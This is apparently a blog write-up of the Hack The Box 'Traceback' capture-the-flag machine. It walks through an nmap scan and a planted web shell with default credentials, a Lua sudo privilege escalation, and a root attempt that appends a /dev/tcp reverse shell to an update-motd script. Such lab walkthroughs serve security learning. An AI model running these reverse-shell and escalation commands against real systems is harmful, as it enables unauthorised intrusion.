---
featured_image: "/posts/Traceback/traceback.png"
title : HTB 17/20 Traceback
published : true
date: 2021-04-26
description: "Traceback Writeup"
author : PS
---
## Foothold
*nmap*
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 22:00 EEST
Nmap scan report for 10.10.10.181
Host is up (0.086s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.51 second
```
![img](1.png)
![img](2.png)
![img](3.png)
![img](4.png)
After manually trying to access one of those web shell I've managed to find one  
![img](5.png)
The default password is admin:admin  
![img](6.png)
run this , and also have a nc opened  
```bash
>>> nc -nlvp 6969
Connection from 10.10.10.181:37518
bash: cannot set terminal process group (716): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/var/www/html$ 
```
## User
```bash
webadmin@traceback:/var/www/html$ ls
ls
bg.jpg
index.html
smevk.php
webadmin@traceback:/var/www/html$ cd ~ 
cd ~
webadmin@traceback:/home/webadmin$ ls
ls
note.txt
webadmin@traceback:/home/webadmin$ cat note.txt
cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:/home/webadmin$ 
```
```bash
webadmin@traceback:/home$ sudo -l
sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:/home$ 
```
```bash
webadmin@traceback:/home/webadmin$ echo "require('os');" > priv.lua
echo "require('os');" > priv.lua
webadmin@traceback:/home/webadmin$ echo "os.execute('/bin/bash');" >> priv.lua
<badmin$ echo "os.execute('/bin/bash');" >> priv.lua
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit ./priv.lua
<n$ sudo -u sysadmin /home/sysadmin/luvit ./priv.lua
ls
note.txt
priv.lua
privesc.lua
whoami
sysadmin
bash -i                                         
bash: cannot set terminal process group (716): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@traceback:/home/webadmin$ 
sysadmin@traceback:/home/webadmin$ cd ~
cd ~
sysadmin@traceback:~$ ls
ls
luvit
user.txt
sysadmin@traceback:~$ cat user.txt
cat user.txt
6eee71d3bb03f0ed1dc500de6b4c54e0
sysadmin@traceback:~$ 
```
## Root
After uploading linpeas we find an interesting process updatemotd.d
```bash
sysadmin@traceback:~$ cd /etc/update-motd.d/
cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls
ls
00-header
10-help-text
50-motd-news
80-esm
91-release-upgrade
sysadmin@traceback:/etc/update-motd.d$ 
```
I tried to use 
```bash
sysadmin@traceback:/etc/update-motd.d$ echo "'bash -i >& /dev/tcp/10.10.14.7/9191 0>&1'" >> 00-header
< -i >& /dev/tcp/10.10.14.7/9191 0>&1'" >> 00-header
sysadmin@traceback:/etc/update-motd.d$ 
```
It was not working ,so i tried a python reverse shell , also you have to have a new ssh session , do that and kaboomm you get root  
PS out 
